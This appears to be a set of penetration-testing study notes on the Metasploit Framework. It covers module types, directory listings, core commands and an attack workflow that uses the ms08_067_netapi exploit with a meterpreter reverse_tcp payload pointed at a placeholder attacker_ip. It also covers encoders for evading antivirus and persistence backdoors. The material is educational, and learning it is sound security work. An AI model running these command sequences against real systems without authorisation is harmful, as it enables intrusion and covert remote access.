Metasploit is a powerful and versatile penetration testing framework that allows you to exploit vulnerabilities in system, conduct reconnaissance, and perform post-exploitation tasks

Metasploit is an open-source penetration testing framework that helps security professionals find and exploit vulnerabilities in computer systems. It includes a database of known vulnerabilities and tools and scripts for exploiting them. It is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.

Metasploit has two main versions : 
- **Metasploit Pro**: The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI).
- **Metasploit Framework**: The open-source version that works from the command line. 

The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.

---

### Understanding the Basics of Metasploit
Metasploit works with **modules** that help with various tasks like scanning, exploitation, and post-exploitation. Here are some essential commands you'll frequently use:

#### Core Commands :
- `search <keyword>`: Search for exploits, scanners, or auxiliary modules based on keywords (like "ftp," "smtp").
- `use <module_name>`: Load a specific module for usage.
- `info <module_name>`: Get detailed information about the selected module.
- `show options`: Show available configuration options for the loaded module.
- `set <option> <value>`: Set specific options, like the target IP address (`RHOST`).
- `run` or `exploit`: Execute the module you've configured.

---

The main components of the Metasploit Framework can be summarized as follows : 
- **msfconsole**: The main command-line interface.
- **Modules**: supporting modules such as exploits, scanners, payloads, etc.
	- in metasploit, modules are reusable components that perform 
- **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. 
	- Some of these tools are 
		- msfvenom, 
		- pattern_create and 
		- pattern_offset
# Main Components of Metasploit
While using the metasploit framework, one will primarily interact with metasploit console. It can be launched from the terminal using the command `msfconsole`

Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload.
- **Exploit:** A piece of code that uses a vulnerability present on the target system.
- **Vulnerability:** A design, coding, or logic flaw affecting the target system.
- **Payload:** An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. 
	- Payloads are the code that will run on the target system.

### Metasploit Modules Overview
There are four main types of modules in Metasploit:
1. **Exploits**
    - Exploits take advantage of vulnerabilities in systems or applications to gain access.
    - Example : 
    ```bash
    use exploit/windows/smb/ms08_067_netapi
	```
2. **Auxiliary modules**
	- These are use for tasks like scanning, fuzzing, and service enumeration
	- They do not exploit the system but gather useful data 
	- Example : 
	```bash
	use auxiliary/scanner/portscan/tcp
	```
3. **Payloads**
	- Payloads are code delivered to the target machine after exploiting a vulnerability
	- They can create a remote shell, open a backdoor, or gather information
	- e.g. 
	```bash
	set PAYLOAD windows/meterpreter/reverse_tcp
	```
4. **Encoder Modules** 
	- Encoders are used to modify payloads in a way that avoids detection by security software (like antivirus)
	- When payloads are being detected, encoders obfuscate the payload to evade detection
	- Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them 
	- e.g.
```bash
set ENCODER x86/shikata_ga_nai
```
5. **Nop (No-operation) modules**
	- Nop generators are used to generate No operation instructions to pad shellcode and ensure it executes correctly
	- To fine-tune exploit payloads and improve reliability, especially with buffer overflows
	- NOPs (No OPeration) do nothing, literally. They are often used as a buffer to achieve consistent payload sizes.
```bash
set NOP x86/single_byte
```
1. **Post-Exploitation Modules**
	- After compromising a system, post-exploitation modules allow you to gather further information, escalate privileges, or move laterally within the network
	- e.g. 
	```bash
	use post/windows/gather/enum_logged_on_users
	```
#### Auxiliary Modules
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/
auxiliary/
├── admin
├── analyze
├── bnat
├── client
├── cloud
├── crawler
├── docx
├── dos
├── example.py
├── example.rb
├── fileformat
├── fuzzers
├── gather
├── parser
├── pdf
├── scanner
├── server
├── sniffer
├── spoof
├── sqli
├── voip
└── vsploit

20 directories, 2 files
```
#### Encoders
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/
encoders/
├── cmd
├── generic
├── mipsbe
├── mipsle
├── php
├── ppc
├── ruby
├── sparc
├── x64
└── x86

10 directories, 0 files
```
#### Evasion
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/
evasion/
└── windows
    ├── applocker_evasion_install_util.rb
    ├── applocker_evasion_msbuild.rb
    ├── applocker_evasion_presentationhost.rb
    ├── applocker_evasion_regasm_regsvcs.rb
    ├── applocker_evasion_workflow_compiler.rb
    ├── process_herpaderping.rb
    ├── syscall_inject.rb
    ├── windows_defender_exe.rb
    └── windows_defender_js_hta.rb

1 directory, 9 files
```
#### Exploit
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/
exploits/
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
├── example_linux_priv_esc.rb
├── example.py
├── example.rb
├── example_webapp.rb
├── firefox
├── freebsd
├── hpux
├── irix
├── linux
├── mainframe
├── multi
├── netware
├── openbsd
├── osx
├── qnx
├── solaris
├── unix
└── windows

20 directories, 4 files
```

#### NOPs
NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/
nops/
├── aarch64
├── armle
├── cmd
├── mipsbe
├── php
├── ppc
├── sparc
├── tty
├── x64
└── x86

10 directories, 0 files
```
#### Payloads
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/
payloads/
├── adapters
├── singles
├── stagers
└── stages

4 directories, 0 files
```
- **Adapters:** 
	- An adapter wraps single payloads to convert them into different formats. 
	- For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.  
- **Singles:** 
	- Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
- **Stagers:** 
	- Responsible for setting up a connection channel between Metasploit and the target system. 
	- Useful when working with staged payloads. 
		- “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). 
		- This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
- **Stages:** 
	- Downloaded by the stager. 
	- This will allow you to use larger sized payloads.

#### Post
- will be useful on the final stage of the penetration testing process, post-exploitation
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/
post/
├── aix
├── android
├── apple_ios
├── bsd
├── firefox
├── hardware
├── linux
├── multi
├── networking
├── osx
├── solaris
└── windows

12 directories, 0 files
```

### Key Metasploit Components
1. **Exploit Database**
	- Metasploit houses a massive database of publicly know exploits
	- You can search through it for vulnerabilities in the target system
2. **Meterpreter**
	- Meterpreter is the default payload used in metasploit, offering a suite of post-exploitation tools to help gather information, escalate privileges, or maintain access 
3. **Nmap Integration**
	- nmap can be integrated with metasploit for advanced scanning and port mapping 
```bash
db_nmap -sV target_ip
```
---

# Common Workflow in Metasploit
1. **Scanning and Discovery**
	- use `Nmap` or `auxiliary modules` for scanning 
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS target_ip
run
```
2. **Searching for Exploits**
	- Based on the results, search for relevant exploits 
	- e.g. if a service like `SMB` is discovered
```bash
search smb
```
3. **Selecting an Exploit**
	- Choose an exploit form the search results
```bash
use exploit/windows/smb/ms08_067_netapi
```
4. **Setting Options**
	- Set the target IP and other necessary parameters 
```bash
set RHOSTS target_ip
set LHOST attacker_ip
set PAYLOAD windows/meterpreter/reverse_tcp
```
5. **Exploiting the target**
	- Once all the options are configured, execute the exploit 
```bash
exploit
```
6. **Post-Exploitation**
	- After successfully exploiting the target, you can use post-exploitation modules 
	- e.g.
```bash
use post/windows/gather/enum_logged_on_users
```
---
# Important Commands Recap
- Search for modules
```bash
search <keyword>
```
- view information about a module
```bash
info <module_name>
```
- set exploit/payload/option
```bash
set <option_name> <value>
```
- show options of loaded module
```bash
show options
```
- execute an exploit or auxiliary module 
```bash
run or exploit
```

---

# Additional Tips
- **Auto-exploitation**
	- one can use *Autopwn* or *Auxiliary Modules* like *db_autopwn* to automatically match against the discovered services
- **Persistent Session**
	- If you gain access to a machine and need to keep your access alive even after the session ends, use *Persistence Payloads* to create a backdoor
- **Session handling**
	- Once you have a session (like a metasploit shell), you can interact when it using : 
```bash
sessions -i <session_id>
```
- **Database Integration**
	- use Metasploit's built-in database to store results and information from scans  :
```bash
db_nmap <options>
```
